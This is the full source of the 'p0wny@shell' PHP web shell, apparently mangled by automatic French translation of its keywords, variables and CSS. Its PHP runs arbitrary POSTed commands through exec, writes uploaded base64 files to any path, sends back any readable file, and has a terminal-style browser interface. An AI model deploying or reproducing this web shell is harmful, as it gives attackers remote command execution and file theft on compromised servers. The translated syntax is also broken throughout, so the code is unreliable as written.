<? php

function  featureShell ( $ cmd , $ cwd ) {
    $ stdout = tableau ();

    if ( preg_match ( "/ ^ \ s * cd \ s * $ /" , $ cmd )) {
        // passer
    } elseif ( preg_match ( "/^\s*cd\s+(.+)\s*(2>&1)?$/" , $ cmd )) {
        chdir ( $ cwd );
        preg_match ( "/ ^ \ s * cd \ s + ([^ \ s] +) \ s * (2> & 1)? $ /" , $ cmd , $ match );
        chdir ( $ match [ 1 ]);
    } elseif ( preg_match ( "/ ^ \ s * télécharger \ s + [^ \ s] + \ s * (2> & 1)? $ /" , $ cmd )) {
        chdir ( $ cwd );
        preg_match ( "/ ^ \ s * télécharger \ s + ([^ \ s] +) \ s * (2> & 1)? $ /" , $ cmd , $ match );
        return  featureDownload ( $ match [ 1 ]);
    } else {
        chdir ( $ cwd );
        exec ( $ cmd , $ stdout );
    }

     tableau de retour (
        "stdout" => $ stdout ,
        "cwd" => getcwd ()
    );
}

function  featurePwd () {
    return  array ( "cwd" => getcwd ());
}

function  featureHint ( $ fileName , $ cwd , $ type ) {
    chdir ( $ cwd );
    if ( $ type == 'cmd' ) {
        $ cmd = "compgen -c $ nom_fichier" ;
    } else {
        $ cmd = "compgen -f $ nom_fichier" ;
    }
    $ cmd = "/ bin / bash -c \" $ cmd \ "" ;
    $ files = exploser ( "\ n" , shell_exec ( $ cmd ));
     tableau de retour (
        'files' => $ fichiers ,
    );
}

function  featureDownload ( $ filePath ) {
    $ file = @ file_get_contents ( $ filePath );
    if ( $ file === FALSE ) {
         tableau de retour (
            'stdout' => array ( 'Fichier non trouvé / pas de permission de lecture.' ),
            'cwd' => getcwd ()
        );
    } else {
         tableau de retour (
            'name' => basename ( $ filePath ),
            'file' => base64_encode ( $ fichier )
        );
    }
}

function  featureUpload ( $ chemin , $ fichier , $ cwd ) {
    chdir ( $ cwd );
    $ f = @ fopen ( $ chemin , 'wb' );
    si ( $ f === FALSE ) {
         tableau de retour (
            'stdout' => array ( 'Chemin invalide / pas de permission d'écriture.' ),
            'cwd' => getcwd ()
        );
    } else {
        fwrite ( $ f , base64_decode ( $ fichier ));
        fclose ( $ f );
         tableau de retour (
            'stdout' => array ( 'Terminé.' ),
            'cwd' => getcwd ()
        );
    }
}

if ( isset ( $ _GET [ "fonctionnalité" ])) {

    $ réponse = NULL ;

    commutateur ( $ _GET [ "fonctionnalité" ]) {
        cas  "coque" :
            $ cmd = $ _POST [ 'cmd' ];
            if (! preg_match ( '/ 2> /' , $ cmd )) {
                $ cmd . = '2> & 1' ;
            }
            $ response = featureShell ( $ cmd , $ _POST [ "cwd" ]);
            pause ;
        cas  "pwd" :
            $ réponse = featurePwd ();
            pause ;
        cas  "indice" :
            $ response = featureHint ( $ _POST [ 'filename' ], $ _POST [ 'cwd' ], $ _POST [ 'type' ]);
            pause ;
        cas  'upload' :
            $ response = featureUpload ( $ _POST [ 'chemin' ], $ _POST [ 'fichier' ], $ _POST [ 'cwd' ]);
    }

    header ( "Content-Type: application / json" );
    echo  json_encode ( $ réponse );
    mourir ();
}

?> <! DOCTYPE html >

< html >

    < tête >
        < meta  charset = " UTF-8 " />
        < titre > p0wny @ shell: ~ # </ title >
        < meta  name = " viewport " content = " width = device-width, initial-scale = 1.0 " />
        < style >
            html ,  corps {
                marge : 0 ;
                rembourrage : 0 ;
                arrière - plan : # 333 ;
                couleur : # eee ;
                famille de polices : monospace;
            }

            * :: -webkit-scrollbar-track {
                rayon de la bordure : 8 px ;
                couleur de fond : # 353535 ;
            }

            * :: -webkit-scrollbar {
                largeur : 8 px ;
                hauteur : 8 px ;
            }

            * :: -webkit-scrollbar-thumb {
                rayon de la bordure : 8 px ;
                -webkit-box-shadow : insert 0  0  6 px  rgba ( 0 , 0 , 0 , .3 );
                couleur d'arrière-plan : # bcbcbc ;
            }

            # shell {
                arrière - plan : # 222 ;
                largeur maximale : 800 px ;
                marge : 50 px auto 0 auto;
                boîte-ombre : 0  0  5 px  rgba ( 0 ,  0 ,  0 ,  .3 );
                taille de la police : 10 pt ;
                affichage : flex;
                flex-direction : colonne;
                align-items : étirer;
            }

            # shell-content {
                hauteur : 500 px ;
                débordement : automatique;
                rembourrage : 5 px ;
                espace blanc : pré-emballage;
                flex-grow : 1 ;
            }

            # shell-logo {
                poids de la police : gras;
                couleur : # FF4180 ;
                text-align : centre;
            }

            @media ( largeur maximale : 991 px ) {
                # shell-logo {
                    taille de la police : 6 px ;
                    marge : -25px 0 ;
                }

                html ,  corps ,  # shell {
                    hauteur : 100 % ;
                    largeur : 100 % ;
                    max-width : aucun;
                }

                # shell {
                    margin-top : 0 ;
                }
            }

            @media ( largeur maximale : 767 px ) {
                # shell-input {
                    flex-direction : colonne;
                }
            }

            @media ( largeur maximale : 320 px ) {
                # shell-logo {
                    taille de la police : 5 px ;
                }
            }

            . shell-prompt {
                poids de la police : gras;
                couleur : # 75DF0B ;
            }

            . shell-prompt  >  span {
                couleur : # 1BC9E7 ;
            }

            # shell-input {
                affichage : flex;
                boîte-ombre : 0 -1px 0  rgba ( 0 ,  0 ,  0 ,  .3 );
                border-top : rgba ( 255 ,  255 ,  255 ,  .05 ) solide 1 px ;
            }

            # shell-input  >  label {
                flex-grow : 0 ;
                affichage : bloc;
                rembourrage : 0  5 px ;
                hauteur : 30 px ;
                hauteur de ligne : 30 px ;
            }

            # shell-input  # shell-cmd {
                hauteur : 30 px ;
                hauteur de ligne : 30 px ;
                bordure : aucune;
                fond : transparent;
                couleur : # eee ;
                famille de polices : monospace;
                taille de la police : 10 pt ;
                largeur : 100 % ;
                align-self : centre;
            }

            # shell-input  div {
                flex-grow : 1 ;
                align-items : étirer;
            }

            # entrée shell-  input {
                contour : aucun;
            }
        </ style >

        < script >
            var  CWD  =  null ;
            var  commandHistory  =  [ ] ;
            var  historyPosition  =  0 ;
            var  eShellCmdInput  =  null ;
            var  eShellContent  =  null ;

            function  _insertCommand ( commande )  {
                eShellContent . innerHTML  + =  "\ n \ n" ;
                eShellContent . innerHTML  + =  '<span class = \ "shell-prompt \">'  +  genPrompt ( CWD )  +  '</span>' ;
                eShellContent . innerHTML  + =  escapeHtml ( commande ) ;
                eShellContent . innerHTML  + =  "\ n" ;
                eShellContent . scrollTop  =  eShellContent . scrollHeight ;
            }

            function  _insertStdout ( stdout )  {
                eShellContent . innerHTML  + =  escapeHtml ( stdout ) ;
                eShellContent . scrollTop  =  eShellContent . scrollHeight ;
            }

            function  _defer ( rappel )  {
                setTimeout ( rappel ,  0 ) ;
            }

            function  featureShell ( commande )  {

                _insertCommand ( commande ) ;
                if  ( / ^ \ s * upload \ s + [ ^ \ s ] + \ s * $ / . test ( commande ) )  {
                    featureUpload ( commande . match ( / ^ \ s * upload \ s + ( [ ^ \ s ] + ) \ s * $ / ) [ 1 ] ) ;
                }  else  if  ( / ^ \ s * clear \ s * $ / . test ( commande ) )  {
                    // La variable d'environnement TERM du backend shell n'est pas définie. Effacer l'historique des commandes de l'interface utilisateur mais conserver dans la mémoire tampon
                    eShellContent . innerHTML  =  '' ;
                }  else  {
                    makeRequest ( "? feature = shell" ,  { cmd : commande ,  cwd : CWD } ,  function  ( réponse )  {
                        if  ( réponse . hasOwnProperty ( 'fichier' ) )  {
                            featureDownload ( réponse . nom ,  réponse . fichier )
                        }  else  {
                            _insertStdout ( réponse . stdout . join ( "\ n" ) ) ;
                            updateCwd ( réponse . cwd ) ;
                        }
                    } ) ;
                }
            }

            function  featureHint ( )  {
                if  ( eShellCmdInput . value . trim ( ) . length  ===  0 )  return ;   // le champ est vide -> rien à compléter

                function  _requestCallback ( données )  {
                    if  ( données . fichiers . longueur <= 1 )  return ;   // pas d'achèvement

                    if  ( données . fichiers . longueur  ===  2 )  {
                        if  ( type  ===  'cmd' )  {
                            eShellCmdInput . valeur  =  données . fichiers [ 0 ] ;
                        }  else  {
                            var  currentValue  =  eShellCmdInput . valeur ;
                            eShellCmdInput . value  =  currentValue . remplacer ( / ( [ ^ \ s ] * ) $ / ,  données . fichiers [ 0 ] ) ;
                        }
                    }  else  {
                        _insertCommand ( valeur eShellCmdInput . ) ;
                        _insertStdout ( données . fichiers . jointure ( "\ n" ) ) ;
                    }
                }

                var  currentCmd  =  eShellCmdInput . valeur . split ( "" ) ;
                var  type  =  ( currentCmd . length  ===  1 ) ? "cmd" : "fichier" ;
                var  fileName  =  ( type  ===  "cmd" ) ? currentCmd [ 0 ] : currentCmd [ currentCmd . longueur  -  1 ] ;

                makeRequest (
                    "? feature = hint" ,
                    {
                        nom de fichier : fileName ,
                        cwd : CWD ,
                        type : type
                    } ,
                    _requestCallback
                ) ;

            }

            function  featureDownload ( nom ,  fichier )  {
                 élément  var =  document . createElement ( 'a' ) ;
                élément . setAttribute ( 'href' ,  'data: application / octet-stream; base64,'  +  file ) ;
                élément . setAttribute ( 'télécharger' ,  nom ) ;
                élément . le style . display  =  'aucun' ;
                document . corps . appendChild ( élément ) ;
                élément . cliquez sur ( ) ;
                document . corps . removeChild ( élément ) ;
                _insertStdout ( 'Terminé.' ) ;
            }

            function  featureUpload ( chemin )  {
                 élément  var =  document . createElement ( 'entrée' ) ;
                élément . setAttribute ( 'type' ,  'fichier' ) ;
                élément . le style . display  =  'aucun' ;
                document . corps . appendChild ( élément ) ;
                élément . addEventListener ( 'changer' ,  function  ( )  {
                    var  promise  =  getBase64 ( élément . fichiers [ 0 ] ) ;
                    promesse . alors ( fonction  ( fichier )  {
                        makeRequest ( '? feature = upload' ,  { chemin : chemin ,  fichier : fichier ,  cwd : CWD } ,  fonction  ( réponse )  {
                            _insertStdout ( réponse . stdout . join ( "\ n" ) ) ;
                            updateCwd ( réponse . cwd ) ;
                        } ) ;
                    } ,  fonction  ( )  {
                        _insertStdout ( 'Une erreur inconnue côté client s'est produite.' ) ;
                    } ) ;
                } ) ;
                élément . cliquez sur ( ) ;
                document . corps . removeChild ( élément ) ;
            }

            function  getBase64 ( fichier ,  onLoadCallback )  {
                retourner une  nouvelle  promesse ( fonction ( résoudre ,  rejeter )  {
                    var  reader  =  new  FileReader ( ) ;
                    lecteur . onload  =  function ( )  {  résoudre ( reader . result . match ( / base64, ( . * ) $ / ) [ 1 ] ) ;  } ;
                    lecteur . onerror  =  rejeter ;
                    lecteur . readAsDataURL ( fichier ) ;
                } ) ;
            }

            function  genPrompt ( cwd )  {
                cwd  =  cwd  ||  "~" ;
                var  shortCwd  =  cwd ;
                if  ( cwd . split ( "/" ) . length  >  3 )  {
                    var  splittedCwd  =  cwd . divisé ( "/" ) ;
                    shortCwd  =  "… /"  +  splittedCwd [ splittedCwd . length - 2 ]  +  "/"  +  splittedCwd [ splittedCwd . longueur - 1 ] ;
                }
                return  "p0wny @ shell: <span title = \" "  +  cwd  +  " \ ">"  +  shortCwd  +  "</span> #" ;
            }

            function  updateCwd ( cwd )  {
                if  ( cwd )  {
                    CWD  =  cwd ;
                    _updatePrompt ( ) ;
                    retour ;
                }
                makeRequest ( "? feature = pwd" ,  { } ,  function ( response )  {
                    CWD  =  réponse . cwd ;
                    _updatePrompt ( ) ;
                } ) ;

            }

            function  escapeHtml ( chaîne )  {
                 chaîne de retour
                    . remplacer ( / & / g ,  "& amp;" )
                    . remplacer ( / </ g ,  "& lt;" )
                    . remplacer ( /> / g ,  "& gt;" ) ;
            }

            function  _updatePrompt ( )  {
                var  eShellPrompt  =  document . getElementById ( "invite du shell" ) ;
                eShellPrompt . innerHTML  =  genPrompt ( MDC ) ;
            }

            function  _onShellCmdKeyDown ( événement )  {
                switch  ( event . key )  {
                    case  "Enter" :
                        featureShell ( eShellCmdInput . valeur ) ;
                        insertToHistory ( valeur eShellCmdInput . ) ;
                        eShellCmdInput . valeur  =  "" ;
                        pause ;
                    cas  "ArrowUp" :
                        if  ( historyPosition  >  0 )  {
                            historyPosition - ;
                            eShellCmdInput . flou ( ) ;
                            eShellCmdInput . valeur  =  commandHistory [ historyPosition ] ;
                            _defer ( fonction ( )  {
                                eShellCmdInput . focus ( ) ;
                            } ) ;
                        }
                        pause ;
                    case  "ArrowDown" :
                        if  ( historyPosition > = commandHistory . length )  {
                            pause ;
                        }
                        historyPosition ++ ;
                        si  ( historyPosition  ===  commandHistory . longueur )  {
                            eShellCmdInput . valeur  =  "" ;
                        }  else  {
                            eShellCmdInput . flou ( ) ;
                            eShellCmdInput . focus ( ) ;
                            eShellCmdInput . valeur  =  commandHistory [ historyPosition ] ;
                        }
                        pause ;
                    case  'Tab' :
                        événement . preventDefault ( ) ;
                        featureHint ( ) ;
                        pause ;
                }
            }

            function  insertToHistory ( cmd )  {
                commandHistory . pousser ( cmd ) ;
                historyPosition  =  commandHistory . longueur ;
            }

            function  makeRequest ( url ,  paramètres ,  rappel )  {
                function  getQueryString ( )  {
                    var  a  =  [ ] ;
                    for  ( var  key  in  params )  {
                        if  ( paramètres . hasOwnProperty ( clé ) )  {
                            a . push ( encodeURIComponent ( clé )  +  "="  +  encodeURIComponent ( params [ clé ] ) ) ;
                        }
                    }
                    retourner  un . rejoindre ( "&" ) ;
                }
                var  xhr  =  new  XMLHttpRequest ( ) ;
                xhr . open ( "POST" ,  url ,  true ) ;
                xhr . setRequestHeader ( "Content-Type" ,  "application / x-www-form-urlencoded" ) ;
                xhr . onreadystatechange  =  function ( )  {
                    if  ( xhr . readyState  ===  4  &&  xhr . status  ===  200 )  {
                        essayez  {
                            var  responseJson  =  JSON . parse ( xhr . responseText ) ;
                            rappel ( responseJson ) ;
                        }  catch  ( erreur )  {
                            alert ( "Erreur lors de l'analyse de la réponse:"  +  erreur ) ;
                        }
                    }
                } ;
                xhr . envoyer ( getQueryString ( ) ) ;
            }

            document . onclick  =  fonction ( événement )  {
                événement  =  événement  ||  fenêtre . événement ;
                 sélection  var =  fenêtre . getSelection ( ) ;
                var  cible  =  événement . cible  ||  événement . srcElement ;

                if  ( target . tagName  ===  "SELECT" )  {
                    retour ;
                }

                if  ( ! selection . toString ( ) )  {
                    eShellCmdInput . focus ( ) ;
                }
            } ;

            fenêtre . onload  =  fonction ( )  {
                eShellCmdInput  =  document . getElementById ( "shell-cmd" ) ;
                eShellContent  =  document . getElementById ( "contenu du shell" ) ;
                updateCwd ( ) ;
                eShellCmdInput . focus ( ) ;
            } ;
        </ script >
    </ tête >

    < corps >
        < div  id = " shell " >
            < pre  id = " shell-content " >
                < div  id = " shell-logo " >
                </ div >
            </ pré >
            < div  id = " shell-input " >
                < label  for = " shell-cmd " id = " shell-prompt " class = " shell-prompt " > ??? </ label >
                < div >
                    < input  id = " shell-cmd " name = " cmd " onkeydown = " _onShellCmdKeyDown (événement) " />
                </ div >
            </ div >
        </ div >
    </ corps >

</ html >